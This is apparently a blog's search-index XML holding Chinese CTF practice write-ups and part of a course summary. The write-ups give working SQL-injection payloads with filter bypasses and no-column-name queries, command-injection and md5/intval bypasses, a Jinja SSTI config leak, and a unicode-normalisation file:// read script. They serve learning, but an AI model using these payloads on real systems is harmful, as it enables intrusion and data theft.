<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>日常练习24</title>
      <link href="%E7%BB%83%E4%B9%A0/undefined-undefined.html"/>
      <url>%E7%BB%83%E4%B9%A0/undefined-undefined.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>日常练习23——无列名注入</title>
      <link href="test70/undefined-undefined.html"/>
      <url>test70/undefined-undefined.html</url>
      
        <content type="html"><![CDATA[<p>今天学到一个新的sql注入方式——无列名注入，现在做一下记录。  </p><h1 id="SWPU2019-Web1"><a href="#SWPU2019-Web1" class="headerlink" title="[SWPU2019]Web1"></a>[SWPU2019]Web1</h1><p>打开题目，发现是一个登陆界面，可以注册，那么我们就先注册一个账号登入进去。  </p><p><a href="https://img.imgdb.cn/item/6084e01fd1a9ae528f3c8470.png"><img src="https://img.imgdb.cn/item/6084e01fd1a9ae528f3c8470.png"></a>  </p><p>发现是一个发布广告的界面，先发一条广告测试一下。  </p><p><a href="https://img.imgdb.cn/item/6084e062d1a9ae528f3d56fc.png"><img src="https://img.imgdb.cn/item/6084e062d1a9ae528f3d56fc.png"></a>  </p><p>随便测试了一条广告，可以看到成功发布了，显示的就是我们写入的广告名和广告内容。   </p><p>对于这种发布广告并且回显的题目，不是xxs攻击就是sql注入，我先测试了xxs攻击，发现虽然确实存在xxs的漏洞，可以回显，但是却没有什么可以利用的地方，那么接着就只能考虑sql注入了。   </p><p>这里我犯了一个错误，因为一开始看到url栏里有?id=1的信息，我以为是在这里有sql注入，其实并不是这样的，这道题的sql注入点在我们申请发布广告时的广告名这里。   </p><p>比如我们申请一个广告，广告名为：  </p><pre><code>-1&#39; union select 1,2,3#  </code></pre><p><a href="https://img.imgdb.cn/item/6084e1f3d1a9ae528f42a5ae.png"><img src="https://img.imgdb.cn/item/6084e1f3d1a9ae528f42a5ae.png"></a>  </p><p>发现有字符被过滤了，这也说明这里确实存在sql注入的地方。  </p><p>如果我们这样构造   </p><pre><code>-1&#39; union select 1,2,3&#39;  </code></pre><p>却可以成功申请，但是广告名却变成**-1’unionselect1,2,3’**，并且会出现sql的报错。  </p><p><a href="https://img.imgdb.cn/item/6084e2cfd1a9ae528f45b929.png"><img src="https://img.imgdb.cn/item/6084e2cfd1a9ae528f45b929.png"></a>   </p><p>在报错时可以发现它过滤了空格，同时我们也可以发现这道题目的sql注入不再时以#或者–+来闭合而是通过单引号来闭合。（这个要经过不断测试才能得出）  </p><p>那么接下来我们就是查询列数，并查看是哪几位有回显。  </p><pre><code>-1&#39;/**/union/**/select/**/1,2,3,4,5&#39;  </code></pre><p><a href="https://img.imgdb.cn/item/6084e442d1a9ae528f4aaeb7.png"><img src="https://img.imgdb.cn/item/6084e442d1a9ae528f4aaeb7.png"></a>  </p><p>发现列数还是少了，我们一个一个加，发现到22的时候成功出现回显。  </p><pre><code>-1&#39;union/**/select/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&#39;  </code></pre><p><a href="https://img.imgdb.cn/item/6084e541d1a9ae528f4dc1f3.png"><img src="https://img.imgdb.cn/item/6084e541d1a9ae528f4dc1f3.png"></a>   </p><p>回显是2，3位，接着就是查数据库名。  </p><pre><code>-1&#39;union/**/select/**/1,database(),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&#39;  </code></pre><p><a href="https://img.imgdb.cn/item/6084e59fd1a9ae528f4eee58.png"><img src="https://img.imgdb.cn/item/6084e59fd1a9ae528f4eee58.png"></a>  </p><p>得到数据库名web1，然后查表名。  </p><pre><code>-1&#39;union/**/select/**/1,database(),(select group_concat(table_name) from information_schema.tables where table_schema=&#39;web1&#39;),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&#39;  </code></pre><p>但是发现被拦截了</p><p><a href="https://img.imgdb.cn/item/6084e1f3d1a9ae528f42a5ae.png"><img src="https://img.imgdb.cn/item/6084e1f3d1a9ae528f42a5ae.png"></a>    </p><p>看了别人的wp发现应该是information _schema.tables的某个单词被过滤了，但是但Mysql5.6及以上版本中 innodb _index _stats 和innodb _table _stats这两个表中都包含所有新创建的数据库和表名，所以我们可以这样构造：  </p><pre><code>-1&#39;union/**/select/**/1,(select/**/group_concat(table_name)/**/from/**/mysql.innodb_table_stats),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&#39;</code></pre><p>来绕过information _schema.tables的过滤（又学到一个新的绕过小方法）。  </p><p><a href="https://img.imgdb.cn/item/6084e75ad1a9ae528f544cdd.png"><img src="https://img.imgdb.cn/item/6084e75ad1a9ae528f544cdd.png"></a>  </p><p>得到表名，但是根据查询表名的过滤来看，我们如果使用information _schema.columns应该也会被过滤，但是我们却没有另外的表来绕过查询列名了，那么我们该如何在不知道列名的情况下查询呢？这里就要用到无列名注入了。   </p><hr><h2 id="无列名注入"><a href="#无列名注入" class="headerlink" title="无列名注入"></a>无列名注入</h2><p>这里我使用别的大佬的MySQL测试图片来讲解。  </p><p>要想了解无列名注入就要先了解无列名查询。  </p><p>顾名思义，无列名查询就是不需要列名就能查询表中每一列数据。比如下面这个叫xxx的表  </p><p><a href="https://img.imgdb.cn/item/6084eaf1d1a9ae528f854b56.png"><img src="https://img.imgdb.cn/item/6084eaf1d1a9ae528f854b56.png"></a></p><p>它有三列，分别为：id，user,password，我们用无列名查询看一下  </p><pre><code>select 1,2,3 union select * from xxx;  </code></pre><p><a href="https://img.imgdb.cn/item/6084eb77d1a9ae528f8aa1d4.png"><img src="https://img.imgdb.cn/item/6084eb77d1a9ae528f8aa1d4.png"></a>  </p><p>可以看到，此时得到了一个虚拟表，列名分别为1，2，3，其中存储了xxx表中的所有数据。  </p><p>注意，在查询的时候语句的字段数要和表中的一样，否则会报错。  </p><p>而我们的无列名注入就是利用无列名查询，通过无列名查询构造一个虚拟表，在构造此表的同时查询其中的数据。  </p><pre><code>select `2` from (select 1,2,3 union select * from xxx)n  </code></pre><p>这句查询语句就是一个典型的无列名查询，这个语句中的结尾的n是我们创建的新的虚拟表的名字，可以任意输入字符。而select 1,2,3 union select * from xxx则是为xxx这个表的列名赋予了新的列名，分别为1，2.3。而我们查询的是这个虚拟表的列名为2的信息。  </p><p>这里的2要用反引号括起来，这是一个细节。  </p><p><a href="https://img.imgdb.cn/item/6084ed4bd1a9ae528f9ae187.png"><img src="https://img.imgdb.cn/item/6084ed4bd1a9ae528f9ae187.png"></a>  </p><p>可以看到成功查询到了第二列的信息。  </p><p>但是在做题过程中，它可能会过滤反引号``，这时我们就需要给字段取别名。  </p><pre><code>select 1 as a,2 as b,3 as c union select * from xxx;  </code></pre><p>这里的as就是取别名的操作。  </p><p><a href="https://img.imgdb.cn/item/6084ee4bd1a9ae528fa251cf.png"><img src="https://img.imgdb.cn/item/6084ee4bd1a9ae528fa251cf.png"></a>  </p><p>可以看到列名被换成了a,b,c，我们也就可以使用a,b,c来查询。  </p><p>以上就是关于无列名注入的基本讲解。  </p><hr><p>接下来我们回到题目，因为不能直接查询列名，我们使用无列名注入。  </p><p>这里的表有  </p><pre><code>FLAG_TABLE,news,users,gtid_slave_pos,ads,users  </code></pre><p>要想找flag要一个个试，我们这里直接说结果，flag在user表中。  </p><p>这个表有三列，这个需要自己和上面一样一个一个判断，我们先查询第二列的内容。  </p><pre><code>-1&#39;union/**/select/**/1,(select/**/group_concat(aa)/**/from/**/(select/**/1,2/**/as/**/aa,3/**/union/**/select/**/*/**/from/**/users)a),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&#39;  </code></pre><p><a href="https://img.imgdb.cn/item/6084f087d1a9ae528fb172a0.png"><img src="https://img.imgdb.cn/item/6084f087d1a9ae528fb172a0.png"></a>  </p><p>发现有flag和admin字符，那么flag应该在第三列。  </p><pre><code>-1&#39;union/**/select/**/1,(select/**/group_concat(aa)/**/from/**/(select/**/1,2,3/**/as/**/aa/**/union/**/select/**/*/**/from/**/users)a),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&#39;  </code></pre><p><a href="https://img.imgdb.cn/item/6084f0f4d1a9ae528fb41ff1.png"><img src="https://img.imgdb.cn/item/6084f0f4d1a9ae528fb41ff1.png"></a>  </p><p>得到flag。   </p><h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>这道题是一个新的关于sql注入的知识点，也就是无列名注入，原理并不难理解，实际操作也不难，而这道题目之外的小知识点也需要记录，比如存放所有表名的并不是只有那一个表，取别名来绕过反引号过滤等等。只能说sql注入路还很远。要学的还有很多  </p><p>下面附上sql无列名注入学习博客：  </p><p><a href="https://blog.csdn.net/weixin_46330722/article/details/109605941?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161932292416780255247671%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=161932292416780255247671&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-109605941.first_rank_v2_pc_rank_v29&utm_term=%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5">sql注入之无列名注入</a></p>]]></content>
      
      
      <categories>
          
          <category> test70 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 练习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>日常练习22</title>
      <link href="test69/undefined-undefined.html"/>
      <url>test69/undefined-undefined.html</url>
      
        <content type="html"><![CDATA[<p>做了一道基础题，记录一下。  </p><h1 id="WUSTCTF2020-朴实无华"><a href="#WUSTCTF2020-朴实无华" class="headerlink" title="[WUSTCTF2020]朴实无华"></a>[WUSTCTF2020]朴实无华</h1><p>这道题其实难度不大，主要是出题人很会藏东西，但是这道题只要找到它藏的关键信息就很容易解出来。  </p><p>打开题目，看见两个单词：hack me，除此之外就没有什么东西了，那么根据做题经验，直接f12。  </p><p><a href="https://img.imgdb.cn/item/60842601d1a9ae528f2f15fb.png"><img src="https://img.imgdb.cn/item/60842601d1a9ae528f2f15fb.png"></a>  </p><p>看到头文件信息中有有bot字样，猜测应该是robots.txt。查看一手。  </p><p><a href="https://img.imgdb.cn/item/60842756d1a9ae528f3f32a5.png"><img src="https://img.imgdb.cn/item/60842756d1a9ae528f3f32a5.png"></a>  </p><p>发现给了一个假flag的文件，我们还是打开看看。  </p><p>确实是假的flag，除此之外没有东西了，那就抓包看看。  </p><p><a href="https://img.imgdb.cn/item/608427ead1a9ae528f462672.png"><img src="https://img.imgdb.cn/item/608427ead1a9ae528f462672.png"></a>  </p><p>发现头文件信息中有Look_at _me: /fl4g.php这样的提示，那么就打开这个php文件。  </p><p><a href="https://img.imgdb.cn/item/6084288ad1a9ae528f4d7c0d.png"><img src="https://img.imgdb.cn/item/6084288ad1a9ae528f4d7c0d.png"></a>  </p><p>终于得到了源码，源码里的中文乱码了，但是不是很影响。我们开始代码审计：（我这里给出原本的源码）  </p><pre><code>&lt;?phpheader(&#39;Content-type:text/html;charset=utf-8&#39;);error_reporting(0);highlight_file(__file__);//level 1if (isset($_GET[&#39;num&#39;]))&#123;$num = $_GET[&#39;num&#39;];if(intval($num) &lt; 2020 &amp;&amp; intval($num + 1) &gt; 2021)&#123;    echo &quot;我不经意间看了看我的劳力士, 不是想看时间, 只是想不经意间, 让你知道我过得比你好.&lt;/br&gt;&quot;;&#125;else&#123;    die(&quot;金钱解决不了穷人的本质问题&quot;);&#125;&#125;else&#123;die(&quot;去非洲吧&quot;);&#125;//level 2if (isset($_GET[&#39;md5&#39;]))&#123;   $md5=$_GET[&#39;md5&#39;];   if ($md5==md5($md5))   echo &quot;想到这个CTFer拿到flag后, 感激涕零, 跑去东澜岸, 找一家餐厅, 把厨师轰出去, 自己炒两个拿手小菜, 倒一杯散装白酒, 致富有道, 别学小暴.&lt;/br&gt;&quot;;else   die(&quot;我赶紧喊来我的酒肉朋友, 他打了个电话, 把他一家安排到了非洲&quot;);&#125;else&#123;die(&quot;去非洲吧&quot;);&#125;//get flagif (isset($_GET[&#39;get_flag&#39;]))&#123;$get_flag = $_GET[&#39;get_flag&#39;];if(!strstr($get_flag,&quot; &quot;))&#123;    $get_flag = str_ireplace(&quot;cat&quot;, &quot;wctf2020&quot;, $get_flag);    echo &quot;想到这里, 我充实而欣慰, 有钱人的快乐往往就是这么的朴实无华, 且枯燥.&lt;/br&gt;&quot;;    system($get_flag);&#125;else&#123;    die(&quot;快到非洲了&quot;);&#125;&#125;else&#123;die(&quot;去非洲吧&quot;);&#125;?&gt;去非洲吧</code></pre><p>发现是三层绕过，这三个绕过都是挺基础的，首先是第一个，上传num变量它的值要小于2020，但是加一后要大于2021，这个看似违背逻辑，但是这里要注意这个intval()函数，它默认是十进制，当我们传入科学计数法形式的数字时，比如：1e10.它只会返回字母前数字，也就是1.  </p><p>但是当这个函数进行运算后再输出就会返回正确的结果。  </p><p>那么这道题我们就可以使用科学计数法来绕过这个函数，我们上传num=1e10，这样就能满足两个条件。   </p><p>接着就是第二关md5的绕过，这个绕过要求我们上传的变量md5加密前后相同，其实这个是一个小知识点，我们可以记住这个特殊的字符串：  </p><pre><code>0e215962017   </code></pre><p>这个在md5弱类型绕过上经常会考。  </p><p>最后的一个绕过首先过滤了空格，然后过滤了黑名单中的字符串，这个黑名单过滤的很简单，只过滤了cat，那么我们使用tac来绕过，关于空格我们可以使用$IFS$9来绕过，方法还有很多。  </p><p>payload构造如下：  </p><pre><code>查看文件目录：/fl4g.php?num=1e10&amp;md5=0e215962017&amp;get_flag=ls  </code></pre><p><a href="https://img.imgdb.cn/item/60842bf4d1a9ae528f7654d4.png"><img src="https://img.imgdb.cn/item/60842bf4d1a9ae528f7654d4.png"></a>  </p><p>那个文件名最长的应该就是真的flag。  </p><pre><code>查看文件：/fl4g.php?num=1e10&amp;md5=0e215962017&amp;get_flag=tac$IFS$9fllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag  </code></pre><p>得到flag.  </p><p><a href="https://img.imgdb.cn/item/60842c74d1a9ae528f7c78e7.png"><img src="https://img.imgdb.cn/item/60842c74d1a9ae528f7c78e7.png"></a>  </p><h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>这道题目其实不难，只要找到隐藏信息很容易做出来，考的都是一些小知识点，算是一道基础题，考察一些基本的绕过。  </p>]]></content>
      
      
      <categories>
          
          <category> test69 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 练习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>日常练习19</title>
      <link href="test68/undefined-undefined.html"/>
      <url>test68/undefined-undefined.html</url>
      
        <content type="html"><![CDATA[<h1 id="WesternCTF2018-shrine"><a href="#WesternCTF2018-shrine" class="headerlink" title="[WesternCTF2018]shrine"></a>[WesternCTF2018]shrine</h1><p>这道题目是一道ssti注入，只不过有了新的知识点。  </p><p>打开题目得到源码：  </p><pre><code>import flaskimport osapp = flask.Flask(__name__)app.config[&#39;FLAG&#39;] = os.environ.pop(&#39;FLAG&#39;)@app.route(&#39;/&#39;)def index():return open(__file__).read()@app.route(&#39;/shrine/&#39;)def shrine(shrine):def safe_jinja(s):    s = s.replace(&#39;(&#39;, &#39;&#39;).replace(&#39;)&#39;, &#39;&#39;)    blacklist = [&#39;config&#39;, &#39;self&#39;]    return &#39;&#39;.join([&#39;&#123;&#123;% set &#123;&#125;=None%&#125;&#125;&#39;.format(c) for c in blacklist]) + sreturn flask.render_template_string(safe_jinja(shrine))if __name__ == &#39;__main__&#39;:app.run(debug=True)</code></pre><p>看到题目中给出了模板是flask模板，并且给了两个路由，可以猜到是ssti注入。  </p><p>我们测试在shrine路由下是否又ssti注入点：  </p><pre><code>/shrine/&#123;&#123;7*7&#125;&#125;  </code></pre><p><a href="https://img.imgdb.cn/item/6082c707d1a9ae528f0650b1.png"><img src="https://img.imgdb.cn/item/6082c707d1a9ae528f0650b1.png"></a>  </p><p>发现返回了49，说明确实存在ssti注入。那么接下来就是看一下代码过滤了什么：  </p><pre><code>@app.route(&#39;/shrine/&#39;)def shrine(shrine):def safe_jinja(s):    s = s.replace(&#39;(&#39;, &#39;&#39;).replace(&#39;)&#39;, &#39;&#39;)    blacklist = [&#39;config&#39;, &#39;self&#39;]    return &#39;&#39;.join([&#39;&#123;&#123;% set &#123;&#125;=None%&#125;&#125;&#39;.format(c) for c in blacklist]) + sreturn flask.render_template_string(safe_jinja(shrine))  </code></pre><p>可以看到过滤了左右括号，并且还有一个黑名单，里面有config和self，他会把它们替换为空。  </p><p>但是代码一开始就已经提醒我们flag在app.config[‘FLAG’]中，本来我们直接读config就可以得到flag了，但是现在它是黑名单里的，这时候就要用到一个知识点：  </p><pre><code>Python的沙箱逃逸可以利用Python对象之间的引用关系来调用被禁用的函数对象。  </code></pre><p>这里我们调用python的内置函数url_for，如果搭配上globals，我们就能看到当前位置的全局变量。  </p><pre><code>/shrine/&#123;&#123;url_for.__globals__&#125;&#125;   </code></pre><p><a href="https://img.imgdb.cn/item/6082ca2ed1a9ae528f2a94e4.png"><img src="https://img.imgdb.cn/item/6082ca2ed1a9ae528f2a94e4.png"></a>  </p><p>我们找到current_app，这个就是当前的app，我们直接读它的config就行了。  </p><pre><code>/shrine/&#123;&#123;url_for.__globals__['current_app'].config&#125;&#125;  </code></pre><p><a href="https://img.imgdb.cn/item/6082ca9cd1a9ae528f2fc1d5.png"><img src="https://img.imgdb.cn/item/6082ca9cd1a9ae528f2fc1d5.png"></a>  </p><p>得到flag。  </p><h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>这道题就是一个ssti注入的知识点，其实我也没怎么看懂，先记住吧。</p>]]></content>
      
      
      <categories>
          
          <category> test68 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 练习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>日常练习18</title>
      <link href="test67/undefined-undefined.html"/>
      <url>test67/undefined-undefined.html</url>
      
        <content type="html"><![CDATA[<p>这道题和我之前做到的那道unicode编码漏洞问题有相同之处，除此之外又考察了一些代码审计和nginx的相关知识点。   </p><h1 id="SUCTF-2019-Pythonginx"><a href="#SUCTF-2019-Pythonginx" class="headerlink" title="[SUCTF 2019]Pythonginx"></a>[SUCTF 2019]Pythonginx</h1><p>打开题目就已经给出了源码。  </p><pre><code>@app.route(&#39;/getUrl&#39;, methods=[&#39;GET&#39;, &#39;POST&#39;])def getUrl():url = request.args.get(&quot;url&quot;)host = parse.urlparse(url).hostnameif host == &#39;suctf.cc&#39;:    return &quot;我扌 your problem? 111&quot;parts = list(urlsplit(url))host = parts[1]if host == &#39;suctf.cc&#39;:    return &quot;我扌 your problem? 222 &quot; + hostnewhost = []for h in host.split(&#39;.&#39;):    newhost.append(h.encode(&#39;idna&#39;).decode(&#39;utf-8&#39;))parts[1] = &#39;.&#39;.join(newhost)#去掉 url 中的空格finalUrl = urlunsplit(parts).split(&#39; &#39;)[0]host = parse.urlparse(finalUrl).hostnameif host == &#39;suctf.cc&#39;:    return urllib.request.urlopen(finalUrl).read()else:    return &quot;我扌 your problem? 333&quot;&lt;/code&gt;&lt;!-- Dont worry about the suctf.cc. Go on! --&gt;&lt;!-- Do you know the nginx? --&gt;  </code></pre><p>可以看到路由是/getUrl,代码结尾告诉我们不用在意这个suctf.cc这个域名，然后让我们了解一下nginx这个东西，那我们先是要简单上网百度一下的。  </p><p>经过查询后发现这个nginx是一个是开源、高性能、高可靠的 Web 和反向代理服务器，具体介绍如下：  </p><pre><code>Nginx 是开源、高性能、高可靠的 Web 和反向代理服务器，而且支持热部署，几乎可以做到 7 * 24 小时不间断运行，即使运行几个月也不需要重新启动，还能在不间断服务的情况下对软件版本进行热更新。性能是 Nginx 最重要的考量，其占用内存少、并发能力强、能支持高达 5w 个并发连接数，最重要的是，Nginx 是免费的并可以商业化，配置使用也比较简单。Nginx 的最重要的几个使用场景：静态资源服务，通过本地文件系统提供服务；反向代理服务，延伸出包括缓存、负载均衡等；API 服务，OpenResty ；对于前端来说 Node.js 不陌生了，Nginx 和 Node.js 的很多理念类似，HTTP 服务器、事件驱动、异步非阻塞等，且 Nginx 的大部分功能使用 Node.js 也可以实现，但 Nginx 和 Node.js 并不冲突，都有自己擅长的领域。Nginx 擅长于底层服务器端资源的处理（静态资源处理转发、反向代理，负载均衡等），Node.js 更擅长上层具体业务逻辑的处理，两者可以完美组合，共同助力前端开发。  </code></pre><p>但是这道题目并不需要我们多么深入了解nginx，我们要得到flag，就需要知道nginx一些文件存放的地方  </p><pre><code>配置文件存放目录：/etc/nginx主配置文件：/etc/nginx/conf/nginx.conf管理脚本：/usr/lib64/systemd/system/nginx.service模块：/usr/lisb64/nginx/modules应用程序：/usr/sbin/nginx程序默认存放位置：/usr/share/nginx/html日志默认存放位置：/var/log/nginx配置文件目录为：/usr/local/nginx/conf/nginx.conf  </code></pre><p>我们要想找到flag文件就要从配置文件目录来找，接下来就是看源码来分析了：  </p><p>可以看到源码中的陌生函数是urlparse(),urlsplit()。而变量host就是我们上传的url进行变化后的字符串。在结尾如果if host == ‘suctf.cc’:那么就执行如下代码   </p><pre><code>return urllib.request.urlopen(finalUrl).read()  </code></pre><p>也就是会打开我们上传的url的路径的文件。那么我们应该上传的是file://协议。  </p><p>接下来具体看一下这两个函数作用。  </p><pre><code>顾名思义，urlsplit是拆分，而urlparse是解析，所以urlparse粒度更为细致区别split函数在分割的时候，path和params属性是在一起的代码示例# -*- coding: utf-8 -*-from urllib.parse import urlsplit, urlparseurl = &quot;https://username:password@www.baidu.com:80/index.html;parameters?name=tom#example&quot;print(urlsplit(url))&quot;&quot;&quot;SplitResult(scheme=&#39;https&#39;, netloc=&#39;username:password@www.baidu.com:80&#39;, path=&#39;/index.html;parameters&#39;, query=&#39;name=tom&#39;, fragment=&#39;example&#39;)&quot;&quot;&quot;print(urlparse(url))&quot;&quot;&quot;ParseResult(scheme=&#39;https&#39;, netloc=&#39;username:password@www.baidu.com:80&#39;, path=&#39;/index.html&#39;, params=&#39;parameters&#39;, query=&#39;name=tom&#39;, fragment=&#39;example&#39;)   </code></pre><p>可以看到这两个函数都是对上传的url进行拆解的函数，只不过拆解的细分程度不同罢了。  </p><p>简单来说就是前两个if判断语句要求host不能为suctf.cc,第三个语句则是要求经过了decode(‘utf-8’) 之后传进了 urlunsplit 函数后，<strong>意思是将域名每个部分进行idna编码后，再utf-8解码，</strong>使host==suctf.cc，可以看出这是要让我们绕过前两个if。  </p><p>由上面的utf-8我们就可以想到之前那道unicode编码造成的安全问题了。猜测这道题目也是有关Unicode编码转换的问题。  </p><p>因为前面已经说过了，我们既要使host不等于suctf.cc，又要使它经过编码后等于suctf.cc那么我们就可以使用这个符号<strong>℆</strong>，我们这样构造：  </p><pre><code>file://suctf.c℆sr/local/nginx/conf/nginx.conf  </code></pre><p>这样经过转换后还是等于suctf.cc.满足了三个if条件。  </p><p><a href="https://img.imgdb.cn/item/6081b68fd1a9ae528ff6eca9.png"><img src="https://img.imgdb.cn/item/6081b68fd1a9ae528ff6eca9.png"></a>  </p><p>得到flag文件路径。  </p><pre><code>file://suctf.c℆sr/fffffflag</code></pre><p>得到flag。</p><p><a href="https://img.imgdb.cn/item/6081b6d5d1a9ae528ff96618.png"><img src="https://img.imgdb.cn/item/6081b6d5d1a9ae528ff96618.png"></a>  </p><p>其实关于这个特殊字符可以使用脚本跑出来，有很多可以使用的字符，其原理都是一样的。  </p><p>附上大佬脚本：  </p><pre><code>from urllib.parse import urlparse,urlunsplit,urlsplitfrom urllib import parsedef get_unicode():for x in range(65536):    uni=chr(x)    url=&quot;http://suctf.c&#123;&#125;&quot;.format(uni)    try:        if getUrl(url):            print(&quot;str: &quot;+uni+&#39; unicode: \\u&#39;+str(hex(x))[2:])    except:        passdef getUrl(url):url=urlhost=parse.urlparse(url).hostnameif host == &#39;suctf.cc&#39;:    return Falseparts=list(urlsplit(url))host=parts[1]if host == &#39;suctf.cc&#39;:    return Falsenewhost=[]for h in host.split(&#39;.&#39;):    newhost.append(h.encode(&#39;idna&#39;).decode(&#39;utf-8&#39;))parts[1]=&#39;.&#39;.join(newhost)finalUrl=urlunsplit(parts).split(&#39; &#39;)[0]host=parse.urlparse(finalUrl).hostnameif host == &#39;suctf.cc&#39;:    return Trueelse:    return Falseif __name__==&#39;__main__&#39;:get_unicode()</code></pre><h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>这道题考了几个新的知识点，其一是关于nginx的了解，了解其基本的配置文件的路径，其二是对这两个函数的了解。关于绕过匹配用到的其实是前不久刚学过的Unicode编码的问题，出题人想要考察的就是这一点，后来发现这是blackhat议题之一HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization。下面给出相关链接。  </p><p><a href="https://i.blackhat.com/USA-19/Thursday/us-19-Birch-HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization.pdf">blackhat议题——HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization</a><br><a href="https://blog.csdn.net/Janson_Lin/article/details/105954705?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161909758416780271533785%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=161909758416780271533785&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-105954705.first_rank_v2_pc_rank_v29&utm_term=nginx">Nginx 介绍</a>  </p>]]></content>
      
      
      <categories>
          
          <category> test67 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 练习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第三周学习总结</title>
      <link href="note8/undefined-undefined.html"/>
      <url>note8/undefined-undefined.html</url>
      
        <content type="html"><![CDATA[<h3 id="1-本视频一开始介绍了哪两个工具，他们的作用分别是什么？为什么作者会推荐firefox，它的优点是什么？（5分）"><a href="#1-本视频一开始介绍了哪两个工具，他们的作用分别是什么？为什么作者会推荐firefox，它的优点是什么？（5分）" class="headerlink" title="1.本视频一开始介绍了哪两个工具，他们的作用分别是什么？为什么作者会推荐firefox，它的优点是什么？（5分）"></a>1.本视频一开始介绍了哪两个工具，他们的作用分别是什么？为什么作者会推荐firefox，它的优点是什么？（5分）</h3><p>介绍了bp抓包工具和火狐浏览器。  </p><p>bp抓包可以对http和https流量包进行监控修改  </p><p>火狐浏览器设置代理很容易，可以更方便抓包，这点深有体会，除此之外还有hackbar这样好用的工具，可以下载很多有用工具和插件。  </p><h3 id="2-本视频中体现了哪些攻防上的哲学观点？作者希望你养成什么样的思维？这些思维在帮助你挖掘漏洞的时候有什么帮助？结合你的经历与视频内容谈谈你的看法。（10分）"><a href="#2-本视频中体现了哪些攻防上的哲学观点？作者希望你养成什么样的思维？这些思维在帮助你挖掘漏洞的时候有什么帮助？结合你的经历与视频内容谈谈你的看法。（10分）" class="headerlink" title="2.本视频中体现了哪些攻防上的哲学观点？作者希望你养成什么样的思维？这些思维在帮助你挖掘漏洞的时候有什么帮助？结合你的经历与视频内容谈谈你的看法。（10分）"></a>2.本视频中体现了哪些攻防上的哲学观点？作者希望你养成什么样的思维？这些思维在帮助你挖掘漏洞的时候有什么帮助？结合你的经历与视频内容谈谈你的看法。（10分）</h3><p>我们要站在攻击者角度取思考问题，因为世界上没有完美的保护，保护方和攻击方其实是不平衡的，因为攻击者只要找到一个攻击点就可以，但是保护者却要发现所有漏洞才能抵御攻击者，所以我们只要找到可以攻击的一点并且专注于这一点就行了，同时也要像保护方那样思考，思考什么漏洞是最有危害的，什么漏洞是我们最应该攻击的。  </p><h3 id="3-审计以下代码："><a href="#3-审计以下代码：" class="headerlink" title="3.审计以下代码："></a>3.审计以下代码：</h3><pre><code>&lt;?phpif(isset($_GET[ &#39; name &#39; ]))&#123;echo &quot;&lt;h1&gt;Hello &#123;$_GET[&#39;name&#39;]&#125; !&lt;/h1&gt;&quot;;&#125;?&gt;&lt;form method=&quot;GET&quot;&gt;Enter your name: &lt;input type=&quot;input&quot; name=&quot;name&quot;&gt;&lt;br&gt;&lt;input type=&quot; submit&quot;&gt;</code></pre><p>本段代码涉及到客户端，服务端以及通信协议。<br>运行在客户端的代码主要有HTML以及javascript，由浏览器核心负责解释</p><p>通信协议为HTTP协议，有多种格式的请求包，常见的为POST与GET</p><p>运行在服务端的代码为php，由php核心负责解释。</p><p>用户端与服务端通过HTTP通信协议进行交互。</p><h3 id="那么，以上代码中，哪些部分属于客户端的内容，哪些属于服务端的内容？（1分）"><a href="#那么，以上代码中，哪些部分属于客户端的内容，哪些属于服务端的内容？（1分）" class="headerlink" title="那么，以上代码中，哪些部分属于客户端的内容，哪些属于服务端的内容？（1分）"></a>那么，以上代码中，哪些部分属于客户端的内容，哪些属于服务端的内容？（1分）</h3><p>php代码属于服务端，html语言属于客户端</p><h3 id="客户端是通过传递什么参数来控制服务端代码的？（1分）"><a href="#客户端是通过传递什么参数来控制服务端代码的？（1分）" class="headerlink" title="客户端是通过传递什么参数来控制服务端代码的？（1分）"></a>客户端是通过传递什么参数来控制服务端代码的？（1分）</h3><p>通过get方式传递name变量的参数</p><h3 id="客户端通过控制该参数会对服务端造成什么影响，继而使得客户端本身收到影响，从而造成了什么漏洞？如果是xss漏洞，具体又是什么类型的xss漏洞，为什么？（3分）"><a href="#客户端通过控制该参数会对服务端造成什么影响，继而使得客户端本身收到影响，从而造成了什么漏洞？如果是xss漏洞，具体又是什么类型的xss漏洞，为什么？（3分）" class="headerlink" 